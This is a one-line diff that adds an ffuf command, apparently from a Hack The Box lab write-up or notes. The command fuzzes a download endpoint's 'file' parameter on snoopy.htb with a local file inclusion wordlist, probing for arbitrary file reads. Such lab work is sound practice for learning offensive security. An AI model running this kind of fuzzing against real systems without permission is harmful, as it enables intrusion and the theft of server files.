@@ -1,0 +1,1 @@
+ffuf -u "http://snoopy.htb/download?file=FUZZ" -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fl 1
